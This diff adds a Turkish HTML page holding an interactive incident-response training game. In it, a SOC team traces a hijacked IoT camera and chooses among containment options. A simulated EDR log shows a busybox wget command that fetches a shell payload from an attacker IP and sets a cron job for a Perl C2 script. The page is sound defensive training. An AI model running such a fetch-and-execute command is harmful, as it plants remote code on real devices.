@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CyberScenario v1: IoT Krizi</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+  <style>
+    /* Custom styles to match previous design aesthetics */
+    body {
+      background-color: #1a1a2e; /* Dark background */
+      color: #e0e0e0; /* Light text */
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      background-color: #2a2a4a; /* Container background */
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      padding: 20px;
+      max-width: 950px; /* Wider container */
+      width: 100%;
+      margin: 40px auto;
+    }
+    h1 {
+      font-size: 2.5em;
+      color: #8be9fd; /* Accent blue */
+      margin-bottom: 20px;
+    }
+    h2 {
+      font-size: 2em;
+      color: #8be9fd;
+      border-bottom: 2px solid #444466; /* Interactive bg */
+      padding-bottom: 15px;
+      margin-bottom: 25px;
+    }
+    h3 {
+      font-size: 1.5em;
+      color: #8be9fd;
+    }
+    .btn {
+      background-color: #6272a4; /* Dracula purple */
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1.1em;
+      transition: all 0.3s ease;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-weight: 700;
+    }
+    .btn:hover {
+      background-color: #7a8ab9; /* Lighter purple */
+      transform: translateY(-3px);
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+    .btn-start, .btn-continue {
+      font-size: 1.3em;
+      font-weight: bold;
+      text-align: center;
+      background-color: #50fa7b; /* Accent green */
+      color: #282a36; /* Dark text for contrast */
+      justify-content: center;
+    }
+    .scenario-image {
+      border-radius: 8px;
+      border: 1px solid #444466; /* Interactive bg */
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .bg-gray-800 {
+      background-color: #282a36; /* Dracula background */
+    }
+    .border-gray-700 {
+      border-color: #6272a4; /* Dracula purple */
+    }
+    .text-cyan-400 { color: #8be9fd; }
+    .text-cyan-300 { color: #8be9fd; }
+    .text-pink-300 { color: #ff79c6; }
+    .text-red-400 { color: #ff5555; }
+    .text-yellow-300 { color: #f1fa8c; }
+    .text-green-300 { color: #50fa7b; }
+    .text-orange-300 { color: #ffb86c; }
+    .text-indigo-300 { color: #bd93f9; }
+    .text-green-400 { color: #50fa7b; }
+    .text-yellow-400 { color: #f1fa8c; }
+    .text-red-400 { color: #ff5555; }
+    .text-blue-400 { color: #8be9fd; }
+
+    /* Roles Info specific styles (adapted from previous example) */
+    #rolesInfo {
+        background-color: #333355; /* Section bg */
+        border-radius: 8px;
+        padding: 20px;
+        margin-top: 30px;
+        text-align: left;
+        width: 100%;
+        max-width: 600px;
+        border: 1px solid #444466;
+    }
+    #rolesInfo h3 {
+        color: #50fa7b; /* Accent green */
+        margin-top: 0;
+        margin-bottom: 15px;
+        border-bottom: 1px solid #444466;
+        padding-bottom: 10px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+    #rolesInfo ul {
+        list-style-type: none;
+        padding-left: 0;
+        margin: 0;
+    }
+    #rolesInfo ul li {
+        margin-bottom: 10px;
+        padding-left: 25px;
+        position: relative;
+        line-height: 1.5;
+    }
+    #rolesInfo ul li:last-child {
+        margin-bottom: 0;
+    }
+    #rolesInfo ul li::before {
+        content: '\f007'; /* User icon */
+        font-family: 'Font Awesome 6 Free';
+        font-weight: 900;
+        color: #bd93f9; /* Accent purple */
+        position: absolute;
+        left: 0;
+        top: 3px;
+    }
+    #rolesInfo ul li.your-role::before {
+        color: #f1fa8c; /* Accent yellow for your role */
+    }
+    #rolesInfo ul li strong {
+        color: #8be9fd; /* Accent blue */
+    }
+  </style>
+  <script>
+    function nextStep(id) {
+      document.querySelectorAll('.step').forEach(function(s) {
+        s.style.display = 'none';
+      });
+      document.getElementById(id).style.display = 'block';
+      window.scrollTo(0, 0); // Her adımda sayfanın başına git
+    }
+    window.onload = function() {
+      nextStep('step0'); // Simülasyonu başlangıç ekranıyla başlat
+    };
+  </script>
+</head>
+<body class="bg-gray-900 text-white font-sans">
+  <div class="max-w-5xl mx-auto p-6 space-y-10">
+    <header class="text-center border-b border-gray-700 pb-6">
+      <h1 class="text-4xl font-bold text-cyan-400">CyberScenario: IoT Krizi</h1>
+      <p class="text-gray-400 mt-2">ÇOLHAK Corporation – Gelişmiş IoT Kriz Simülasyonu</p>
+    </header>
+
+    <section id="step0" class="step space-y-4 text-center" style="display:none;">
+      <h2 class="text-2xl text-cyan-300 font-semibold">Senaryoya Hoş Geldiniz</h2>
+      <p class="text-gray-300 max-w-2xl mx-auto">Bu interaktif senaryoda, ÇOLHAK Corporation'ın siber güvenlik ekibinin bir üyesisiniz. Göreviniz, gelişen bir güvenlik tehdidini analiz etmek, kritik kararlar almak ve şirketi potansiyel bir felaketten korumaktır. Her adımda sunulan bilgileri dikkatle değerlendirin. Hazır mısınız?</p>
+      <img src="giris.png" alt="Siber Güvenlik Merkezi" class="scenario-image" style="max-height: 300px; width: 100%; object-fit: cover;">
+
+      <div id="rolesInfo" class="mx-auto">
+          <h3><i class="fa-solid fa-people-arrows"></i> Simülasyon Rolleri</h3>
+          <ul>
+              <li class="your-role"><strong>Sizin Rolünüz: Siber Güvenlik Ekibi Üyesi</strong> - ÇOLHAK Corporation'ın siber güvenlik ekibinin bir parçasısınız. Olay müdahalesinde aktif rol alacak, analizler yapacak ve kritik kararlar vereceksiniz.</li>
+              <li><strong>Ezgi (Tier-1 SOC Analisti)</strong> - İlk uyarıları ve şüpheli aktiviteleri tespit eden ekibinizin gözü kulağı.</li>
+              <li><strong>Alper (Tier-2 Analisti)</strong> - Ezgi'den gelen olayları daha derinlemesine analiz eden, teknik araştırmalar yürüten uzmanınız.</li>
+              <li><strong>Ceyda (Siber Güvenlik Yöneticisi)</strong> - Siber güvenlik ekibinizin lideri ve kriz anında nihai kararları veren kişi. Stratejik rehberlik sağlar.</li>
+              <li><strong>Satış Direktörü</strong> - Şirketin ticari operasyonlarından sorumlu, özellikle canlı demo gibi kritik iş süreçlerinin aksamasını istemeyen bir paydaş.</li>
+              <li><strong>Finans Direktörü (CFO)</strong> - Şirketin finansal sağlığından sorumlu üst düzey yönetici.</li>
+          </ul>
+      </div>
+
+      <div class="flex justify-center mt-6">
+        <button onclick="nextStep('step1')" class="bg-cyan-600 hover:bg-cyan-700 px-6 py-3 rounded-lg font-bold text-lg">Simülasyonu Başlat</button>
+      </div>
+    </section>
+
+    <section id="step1" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-cyan-300 font-semibold">🕒 07:15 – İlk Sinyal: Zenginleştirilmiş SIEM Uyarısı</h2>
+      <p>Günün başlangıcında, Tier-1 SOC Analisti Ezgi, SIEM (Güvenlik Bilgi ve Olay Yönetimi) panelinde kritik bir uyarı fark eder. Bir korelasyon kuralı tetiklenmiştir: <strong class="text-red-400">"Kritik Varlık Ağından Bilinmeyen C2 Sunucusuna Periyodik Veri Sızıntısı"</strong>.</p>
+      <img src="alert.png" alt="SIEM Alert Dashboard" class="rounded-xl border-2 shadow-lg border-cyan-400 w-full max-w-3xl mx-auto object-cover">
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
+        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>ALERT ID: 8451
+TRIGGER: Correlation Rule - "Suspicious C2 Beaconing"
+SOURCE IP: 10.10.30.15 (VLAN: IoT Cihazları)
+HOSTNAME: KAMERA-3KAT-OKYANUS
+SOURCE MAC: 00:1A:2B:3C:4D:5E
+DESTINATION IP: 88.54.12.219 (Reputation: Düşük, Kategori: Bilinmiyor)
+PROTOCOL: UDP/443
+OBSERVATION: Son 3 saattir her 5 dakikada bir 128KB'lık bir veri paketi gönderiliyor.
+PCAP SUMMARY: 'update.serve-config.net' için yapılan DNS sorgusu 88.54.12.219'a çözümlendi. UDP payload'u gizlenmiş Base64 dizeleri içeriyor.
+MITRE ATT&CK MAPPING: T1041 (Exfiltration Over C2), T1571 (Non-Standard Port)</code></pre>
+      </div>
+      <blockquote class="italic text-gray-400 border-l-4 border-cyan-500 pl-4 mt-4">Ezgi: "Bu normal bir trafik değil. Kaynak IP, IoT VLAN'ında görünüyor ve hedef daha önce görmediğimiz şüpheli bir adres. MITRE eşleşmeleri de endişe verici. Durumu hemen Tier-2'ye (Alper) iletiyorum."</blockquote>
+      <button onclick="nextStep('step2')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">İncelemeyi Başlat</button>
+    </section>
+    
+    <section id="step2" class="step space-y-6" style="display:none;">
+        <h2 class="text-xl text-pink-300 font-semibold">🕒 07:30 – Eş Zamanlı Gelişmeler ve İlk Karar Anı</h2>
+        <p>Ezgi'nin analiziyle hemen hemen aynı anda, sisteme iki farklı olay kaydı düşer. Ekip olarak hangi olaya öncelik vereceğinize karar vermelisiniz.</p>
+        
+        <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+            <h3 class="font-bold text-pink-400">Olay 1: Yardım Masası Talebi #7254</h3>
+            <p class="mt-2 text-gray-300"><strong>Kullanıcı:</strong> Ayşe Yılmaz</p>
+            <p class="text-gray-300"><strong>Konu:</strong> 3. Kat Okyanus Toplantı Odası'ndaki kamera sürekli donuyor ve web arayüzü çok yavaş. Dün sabah böyle bir sorun yoktu.</p>
+        </div>
+
+        <div class="bg-gray-800 p-4 rounded-lg border border-red-500 mt-4">
+            <h3 class="font-bold text-red-400">Olay 2: Kritik Sistem Uyarısı #9112 (Kırmızı Balık)</h3>
+            <p class="mt-2 text-gray-300"><strong>Sistem:</strong> Active Directory</p>
+            <p class="text-gray-300"><strong>Konu:</strong> Finans Direktörü (CFO) hesabında son 15 dakika içinde 50'den fazla başarısız oturum açma denemesi tespit edildi.</p>
+        </div>
+
+        <blockquote class="italic text-gray-400 border-l-4 border-yellow-500 pl-4 mt-4">Ekip Lideri: "İki tane potansiyel olarak ciddi olayımız var. Biri potansiyel veri sızıntısı, diğeri üst düzey bir yöneticinin hesabına yönelik bir saldırı olabilir. Kaynaklarımız sınırlı, hangisine odaklanıyoruz?"</blockquote>
+        
+        <div class="flex flex-col md:flex-row gap-4 mt-4">
+            <button onclick="nextStep('step3')" class="w-full bg-cyan-600 hover:bg-cyan-700 p-3 rounded-lg font-bold">Öncelik: Kamera Olayı ve SIEM Uyarısını Birleştir</button>
+            <button onclick="nextStep('step_distraction')" class="w-full bg-red-600 hover:bg-red-700 p-3 rounded-lg font-bold">Öncelik: Finans Direktörünün Hesabını Güvenceye Al</button>
+        </div>
+    </section>
+
+    <section id="step_distraction" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-yellow-300 font-semibold">🕒 07:50 – Yanlış Önceliklendirme</h2>
+        <p>Ekip, Finans Direktörünün hesabına odaklanmaya karar verir. Yapılan hızlı araştırma sonucunda, Finans Direktörünün yurt dışında tatilde olduğu ve yeni şifresini unuttuğu için mobil cihazından defalarca yanlış giriş yapmaya çalıştığı anlaşılır. Hesap geçici olarak kilitlenir ve durum kontrol altına alınır.</p>
+        <blockquote class="italic text-gray-400 border-l-4 border-red-500 pl-4 mt-4">Alper: "Bu bir 'false positive' (yanlış alarm) idi. Ancak bu araştırmayı yaparken yaklaşık 20 dakika kaybettik. Şimdi acilen diğer olaya dönmemiz gerekiyor. Umarım geç kalmamışızdır."</blockquote>
+        <button onclick="nextStep('step3')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Asıl Olaya Geri Dön</button>
+    </section>
+
+    <section id="step3" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-green-300 font-semibold">🧑‍💻 08:00 – Alper’in Derinlemesine Analizi</h2>
+      <p>Tier-2 Analisti Alper, SIEM uyarısı ile yardım masası talebini birleştirir. Şüpheli `10.10.30.15` IP adresini şirketin Varlık Yönetim Sistemi'nde sorgular. Sonuç nettir: IP adresi, 3. Kat Okyanus Toplantı Odası'ndaki bir <strong class="text-green-400">"SmartEye 3000"</strong> model IP kamerasına aittir.</p>
+      <p>Alper, analizini bir adım ileri taşıyarak EDR (Uç Nokta Tespiti ve Müdahale) konsolunu kontrol eder ve kritik bir bulguya rastlar:</p>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700 mt-4">
+        <pre class="text-sm text-yellow-300 whitespace-pre-wrap"><code>EDR LOG - Cihaz: KAMERA-3KAT-OKYANUS (10.10.30.15)
+PROCESS: /bin/busybox
+COMMAND: busybox wget http://88.54.12.219/payload.sh -O /tmp/p.sh
+ACTION: 'p.sh' dosyası çalıştırıldı. 'perl /tmp/c2.pl' komutu içeren bir crontab görevi oluşturuldu.</code></pre>
+      </div>
+      <p class="text-gray-300 mt-4">Hızlı bir internet araştırması, bu modelin firmware'inde yakın zamanda açıklanmış kritik bir güvenlik açığını (<strong class="text-red-400">CVE-2025-1337</strong>) ortaya çıkarır. Bu zafiyet, yetkisiz Uzaktan Kod Çalıştırmaya (RCE) olanak tanımaktadır.</p>
+      <blockquote class="italic text-gray-400 border-l-4 border-green-500 pl-4 mt-4">Alper: "Tamam, şimdi her şey oturdu. Kameradaki yavaşlama bir arıza değil, bir semptom. Cihaz, bilinen bir zafiyet üzerinden ele geçirilmiş, bir payload indirmiş ve bir botnet parçası olarak C2 sunucusuna veri gönderiyor. Acilen yöneticimiz Ceyda'ya raporlamalıyız."</blockquote>
+      <button onclick="nextStep('step3_5')" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded">Bulguları Raporla</button>
+    </section>
+    
+    <section id="step3_5" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-orange-300 font-semibold">🕒 08:30 – Ani Komplikasyon: Yönetim Baskısı</h2>
+        <p>Tam Alper bulgularını Ceyda'ya sunmaya hazırlanırken, telefonu çalar. Arayan, Satış Direktörüdür ve sesi oldukça gergindir.</p>
+        <img src="toplanti.png" alt="Toplantı Odası" class="rounded-xl border-2 shadow-lg border-orange-400 w-full max-w-md mx-auto object-cover">
+        <blockquote class="italic text-gray-400 border-l-4 border-orange-500 pl-4 mt-4">Satış Direktörü: "Ekibiniz Okyanus Odası'ndaki kamerayla mı uğraşıyor? O kameranın 1 saat içinde çalışır durumda olması lazım, çok önemli bir yabancı müşteriye canlı demo sunumu yapacağız! Odayı kapatamazsınız, hemen bir çözüm bulun!"</blockquote>
+        <p>Bu yeni bilgi, verilecek kararın sadece teknik değil, aynı zamanda operasyonel bir boyutu olduğunu da ortaya koyuyor. Ekip üzerindeki baskı artmıştır.</p>
+        <button onclick="nextStep('step4')" class="mt-4 bg-orange-600 hover:bg-orange-700 px-4 py-2 rounded">Baskı Altında Kriz Toplantısı Planla</button>
+    </section>
+
+    <section id="step4" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-indigo-300 font-semibold">🏢 08:45 – Kriz Toplantısı ve Karar Anı</h2>
+      <p>Alper, durumu Siber Güvenlik Yöneticisi Ceyda'ya özetler: "CVE-2025-1337 zafiyeti kullanılarak ele geçirilmiş bir IP kameramız var. Şimdilik sadece 'beaconing' aktivitesi gibi görünen küçük veri paketleriyle dışarıyla haberleşiyor. Ağ içinde yanal bir hareket tespit etmedik. Ancak Satış Departmanı'nın 1 saatten az bir süre içinde o kameraya ihtiyacı var."</p>
+      <blockquote class="italic text-gray-400 border-l-4 border-indigo-500 pl-4">Ceyda: "Anlaşıldı. Zamanımız kısıtlı ve baskı altındayız. Elimizde üç seçenek var gibi görünüyor. Karar sizin. Ne yapıyoruz?"</blockquote>
+      <p class="font-bold text-yellow-300">Ekip olarak kararınızı verin:</p>
+      <div class="flex flex-col md:flex-row gap-4 mt-4">
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+          <h3 class="text-lg font-bold text-green-400">Seçenek A: İzole Et ve Yamala (Güvenli Yol)</h3>
+          <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı derhal ağdan ayır. Cihazı laboratuvar ortamına al, imajını yakala ve en son firmware ile güncelle. Tehdit anında durdurulur.</p>
+          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırganın kim olduğu veya nihai hedefinin ne olduğu hakkında daha fazla bilgi edinemeyiz. Satış sunumu iptal olur.</p>
+          <button onclick="nextStep('step_report_safe')" class="mt-4 w-full bg-green-600 hover:bg-green-700 px-4 py-2 rounded">Seçenek A'yı Uygula</button>
+        </div>
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+          <h3 class="text-lg font-bold text-red-400">Seçenek B: Honeypot'a Yönlendir (Riskli Gözlem)</h3>
+          <p class="text-sm text-gray-300 mt-2 flex-grow">Kameranın trafiğini, ana ağdan tamamen izole bir "Honeypot" (Bal Küpü) ortamına yönlendir. Saldırganın davranışlarını (TTP'ler) gizlice izleyerek değerli istihbarat topla.</p>
+          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırgan Honeypot'u fark edebilir veya gözlem sırasında daha agresif bir saldırı (örn: fidye yazılımı) başlatabilir.</p>
+          <button onclick="nextStep('step_report_risk')" class="mt-4 w-full bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Seçenek B'yi Uygula</button>
+        </div>
+        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+            <h3 class="text-lg font-bold text-blue-400">Seçenek C: Karantinaya Al ve Gözlemle (Hesaplı Orta Yol)</h3>
+            <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı internet erişimi olmayan, izole bir VLAN'a taşı. Cihazın internete çıkışını engelle ama yerel ağdaki 'yem' varlıklara ne yapmaya çalıştığını gözlemle. Bu, yanal hareket denemelerini açığa çıkarabilir.</p>
+            <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Yapılandırma hatası saldırganın karantinadan kaçmasına neden olabilir. Satış sunumu yine de gecikebilir.</p>
+            <button onclick="nextStep('step_report_quarantine')" class="mt-4 w-full bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">Seçenek C'yi Uygula</button>
+        </div>
+      </div>
+    </section>
+
+    <section id="step_report_safe" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-green-300 font-semibold">📊 Nihai Rapor: Tehdit Kontrol Altına Alındı</h2>
+      <p>Ekip, A Seçeneğini uygulamaya karar verdi. Kameranın portu derhal kapatıldı ve cihaz laboratuvara taşındı. Satış sunumu iptal edildi.</p>
+      
+      <div class="bg-gray-800 p-4 rounded-lg border border-green-500">
+        <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+            <div>
+                <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
+                <p class="text-2xl font-bold text-yellow-400">1</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Finansal Zarar</p>
+                <p class="text-2xl font-bold text-yellow-400">₺50.000</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Veri Kaybı</p>
+                <p class="text-2xl font-bold text-green-400">0%</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">İtibar Puanı</p>
+                <p class="text-2xl font-bold text-green-400">95/100</p>
+            </div>
+        </div>
+      </div>
+
+      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+        <li><strong>Eylem:</strong> Cihaz ağdan izole edildi, imajı adli analiz için alındı.</li>
+        <li><strong>Bulgu:</strong> Analizde, cihazı bir DDoS botnet'ine dahil etmek için kullanılan basit bir Perl betiği bulundu.</li>
+        <li><strong>Çözüm:</strong> Cihazın firmware'i güncellenerek zafiyet kapatıldı. Ağ taraması, yamalanması gereken aynı modeldeki 3 kamerayı daha ortaya çıkardı ve onlar da güncellendi.</li>
+        <li><strong>Sonuç:</strong> Veri sızıntısı yaşanmadı. Operasyonel aksama (iptal edilen sunum) nedeniyle küçük bir maliyet oluştu, ancak kriz büyümeden önlendi.</li>
+      </ul>
+      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
+    </section>
+    
+    <section id="step_report_risk" class="step space-y-4" style="display:none;">
+      <h2 class="text-xl text-red-400 font-semibold">🚨 Nihai Rapor: Kriz Büyüdü!</h2>
+      <p>Ekip, B Seçeneğini uygulamaya karar verdi. Ancak tecrübeli saldırgan, Honeypot'u fark ederek agresif bir saldırı başlattı.</p>
+
+      <div class="bg-gray-800 p-4 rounded-lg border border-red-500">
+        <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+            <div>
+                <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
+                <p class="text-2xl font-bold text-red-400">4+</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Finansal Zarar</p>
+                <p class="text-2xl font-bold text-red-400">₺15.000.000+</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">Veri Kaybı</p>
+                <p class="text-2xl font-bold text-red-400">40%</p>
+            </div>
+            <div>
+                <p class="text-sm text-gray-400">İtibar Puanı</p>
+                <p class="text-2xl font-bold text-red-400">20/100</p>
+            </div>
+        </div>
+      </div>
+
+      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+        <li><strong>Eylem:</strong> İzlenildiğini anlayan saldırgan, planını değiştirerek elindeki erişimden sonuna kadar faydalanmaya karar verdi.</li>
+        <li><strong>Bulgu:</strong> Kameradan ağdaki diğer zafiyetli sistemleri taramaya başladı. Zayıf bir servis hesabı şifresini kırarak bir dosya sunucusuna yanal hareket gerçekleştirdi.</li>
+        <li><strong>Sonuç:</strong> Saldırgan, Finans ve İK departmanlarının kritik verilerini barındıran sunuculara fidye yazılımı (ransomware) bulaştırdı. Şirket operasyonları durma noktasına geldi.</li>
+        <li><strong>Kriz Yönetimi:</strong> Olay, bir veri ihlaline ve büyük bir operasyonel krize dönüştü. Kurtarma çalışmaları, danışmanlık ücretleri ve iş kaybı maliyeti devasa boyutlara ulaştı.</li>
+      </ul>
+      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
+    </section>
+
+    <section id="step_report_quarantine" class="step space-y-4" style="display:none;">
+        <h2 class="text-xl text-blue-300 font-semibold">📊 Nihai Rapor: İstihbarat Toplandı, Tehdit Etkisiz Hale Getirildi</h2>
+        <p>Ekip, C Seçeneğini uygulamaya karar verdi. Kamera, internet erişimi olmayan özel bir VLAN'a taşındı ve tüm aktiviteleri izlendi.</p>
+        
+        <div class="bg-gray-800 p-4 rounded-lg border border-blue-500">
+            <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+                <div>
+                    <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
+                    <p class="text-2xl font-bold text-green-400">1</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">Finansal Zarar</p>
+                    <p class="text-2xl font-bold text-green-400">₺5.000</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">Veri Kaybı</p>
+                    <p class="text-2xl font-bold text-green-400">0%</p>
+                </div>
+                <div>
+                    <p class="text-sm text-gray-400">İtibar Puanı</p>
+                    <p class="text-2xl font-bold text-green-400">100/100</p>
+                </div>
+            </div>
+        </div>
+
+        <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
+          <li><strong>Eylem:</strong> Kamera izole VLAN'da çalışır durumda bırakıldı ve tüm aktiviteleri NDR (Ağ Tespiti ve Müdahale) aracıyla izlendi.</li>
+          <li><strong>Bulgu:</strong> Saldırganın, kameradan yerel ağa doğru `nmap` ile port taraması yapmaya çalıştığı tespit edildi. Bu davranış, saldırganın TTP'leri (Taktik, Teknik, Prosedürler) hakkında değerli istihbarat sağladı.</li>
+          <li><strong>Çözüm:</strong> Elde edilen istihbaratla, diğer kameraları yamalamadan önce bu tür yanal hareketleri engelleyecek özel güvenlik duvarı kuralları yazıldı. Ardından tüm savunmasız kameralar güvenli bir şekilde güncellendi.</li>
+          <li><strong>Sonuç:</strong> Hem tehdit durduruldu hem de gelecekteki benzer saldırıları proaktif olarak engellemek için değerli bilgiler toplandı. Satış sunumunda yaşanan küçük gecikme dışında kayda değer bir kayıp yaşanmadı.</li>
+        </ul>
+        <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
+    </section>
+
+    <section id="final" class="step space-y-6" style="display:none;">
+      <h2 class="text-2xl font-semibold text-cyan-300 text-center">📌 Kapanış: Vaka Analizi ve Alınan Dersler</h2>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-green-400">Teknik Dersler</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Varlık Yönetimi:</strong> Ağdaki tüm cihazların (özellikle IoT) güncel bir envanterini tutmak, olay anında hızlı teşhis için kritiktir.</li>
+          <li><strong>Ağ Segmentasyonu:</strong> IoT cihazları, kritik sunuculardan ve kullanıcı ağlarından izole, ayrı VLAN'larda tutulmalıdır. Bu, yanal hareketi zorlaştırır.</li>
+          <li><strong>Zafiyet Yönetimi:</strong> Cihaz firmware ve yazılımları için düzenli zafiyet taramaları yapılmalı, yamalar hızla uygulanmalıdır.</li>
+          <li><strong>Aldatma Teknolojileri (Deception):</strong> Honeypot ve izole gözlem ortamları, doğru kullanıldığında, saldırganların taktiklerini anlamak için güçlü araçlardır.</li>
+        </ul>
+      </div>
+      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-yellow-400">Prosedürel Dersler</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Olay Önceliklendirme:</strong> Birden fazla uyarı olduğunda, potansiyel etkiye göre doğru önceliklendirme yapmak, kaynakların verimli kullanılmasını sağlar.</li>
+          <li><strong>SIEM Kurallarının İyileştirilmesi:</strong> Anormal veri sızıntısı ve beaconing gibi aktiviteleri tespit eden korelasyon kurallarının hassasiyeti sürekli geliştirilmelidir.</li>
+          <li><strong>Departmanlar Arası İletişim:</strong> Yardım Masası'ndan gelen kullanıcı şikayetlerini SOC uyarılarıyla ilişkilendirmek, olayların erken tespiti için hayati önem taşır.</li>
+        </ul>
+      </div>
+       <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
+        <h3 class="text-xl font-semibold text-indigo-400">Stratejik Dersler</h3>
+        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
+          <li><strong>Risk İştahı:</strong> "İstihbarat toplama" ile "riski hemen ortadan kaldırma" arasındaki denge, her olayda yönetimle birlikte dikkatle değerlendirilmelidir.</li>
+          <li><strong>Baskı Yönetimi:</strong> Olay müdahalesi sırasında iş birimlerinden gelebilecek operasyonel baskıları yönetmek, siber güvenlik karar süreçlerinin ayrılmaz bir parçasıdır.</li>
+          <li><strong>Erken Müdahalenin Değeri:</strong> Şüpheli bir aktivite tespit edildiğinde hızlı ve kararlı hareket etmek, potansiyel bir krizi önlemenin en etkili yoludur.</li>
+        </ul>
+      </div>
+      <div class="text-center mt-6">
+        <button onclick="nextStep('step0')" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-bold">Simülasyonu Yeniden Başlat</button>
+        <p class="text-center text-sm text-gray-500 mt-8">ShadowCircuit v6 – © 2025 ÇOLHAK</p>
+      </div>
+    </section>
+  </div>
+</body>
+</html>
